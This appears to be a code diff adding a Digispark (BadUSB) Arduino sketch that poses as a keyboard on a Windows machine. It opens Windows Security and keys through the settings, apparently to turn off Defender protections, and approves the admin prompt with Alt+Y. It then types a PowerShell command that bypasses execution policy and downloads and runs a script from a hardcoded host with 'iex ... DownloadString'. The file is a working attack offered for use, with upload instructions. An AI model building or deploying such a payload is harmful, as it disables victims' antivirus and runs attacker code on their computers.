@@ -1,0 +1,65 @@
+// go to tool> board select digispard defauls 16.5mhz
+// upload this and connect board when ask
+
+#include "DigiKeyboard.h"
+
+void setup() {
+  DigiKeyboard.delay(500);  
+  DigiKeyboard.sendKeyStroke(KEY_S, MOD_GUI_LEFT); // Win + S
+  DigiKeyboard.delay(2000);
+  DigiKeyboard.print("Virus & threat Protection");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Enter
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.sendKeyStroke(43); // Tab
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(43); // Tab
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(43); // Tab
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(43); // Tab
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Space
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Space
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // Alt + Y
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(43); // Tab
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Space
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(43); // Tab
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Space
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(43); // Tab
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(43); // Tab
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Space
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(43); // Tab
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); // Alt + Space
+  DigiKeyboard.sendKeyStroke(KEY_C); // C (for closing window)
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Win + R
+  DigiKeyboard.delay(500);
+  DigiKeyboard.print("cmd"); // Type "Hello World"
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Enter
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.print("powershell -ExecutionPolicy Bypass -NoProfile -Command ");
+  DigiKeyboard.print("\"iex (New-Object Net.WebClient).DownloadString('http://192.168.100.6/data.txt')\"");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Enter
+  DigiKeyboard.delay(1000);
+  DigiKeyboard.print("exit"); // Type "Hello World"
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Enter
+}
+
+void loop() {
+  // Empty loop as DigiKeyboard only runs code once
+}
